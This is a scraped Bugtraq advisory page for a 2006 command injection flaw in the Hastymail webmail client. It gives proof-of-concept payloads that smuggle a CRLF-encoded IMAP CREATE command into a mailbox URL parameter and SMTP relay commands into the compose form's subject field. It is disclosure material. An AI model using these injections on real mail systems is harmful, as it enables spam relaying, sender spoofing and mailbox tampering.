#SpeeDr00t@Black Falcon<br>#bid20424<p><b><span style="font-size: 18pt;">Hastymail IMAP SMTP Command Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/20424/info">info</a><br><a href="http://www.securityfocus.com/bid/20424/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/20424/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/20424/solution">solution</a><br><a href="http://www.securityfocus.com/bid/20424/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				20424
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Input Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Oct 10 2006 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Dec 04 2006 09:54PM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				The vendor credits Vicente Aguilera Diaz of Internet Security Auditors with the discovery of this vulnerability.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Hastymail Hastymail 1.5 <br/>
					
				
					Hastymail Hastymail 1.2 <br/>
					
				
					Hastymail Hastymail 1.1 <br/>
					
				
					Hastymail Hastymail 1.0.2 <br/>
					
				
					Hastymail Hastymail 1.0.1 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	An authenticated user can exploit this issue via a web client.<br/><br/>The following proof-of-concept URIs are available:<br/><br/>This example sends the CREATE IMAP commands to the vulnerable parameter:<br/>http://www.example.com/&lt;path_to_hastymail&gt;/html/mailbox.php?id=47fc54216aae12d57570c9703abe1b7d&amp;mailbox=INBOX%2522%0d%0aA0003%20CREATE<br/>%2522INBOX.vad<br/><br/>The SMTP POST relay example from nonexistant email address is available:<br/><br/>POST http://www.example.com/&lt;path_to_hastymail&gt;/html/compose.php HTTP/1.1<br/><br/>to include:<br/><br/>Content-Disposition: form-data; name="subject"<br/><br/>Proof of Concept<br/>.<br/>mail from: hacker@domain.com<br/>rcpt to: victim@otherdomain.com<br/>data<br/>This is a proof of concept of the SMTP command injection in Hastymail<br/>.
	
		<ul>
</ul>
</div>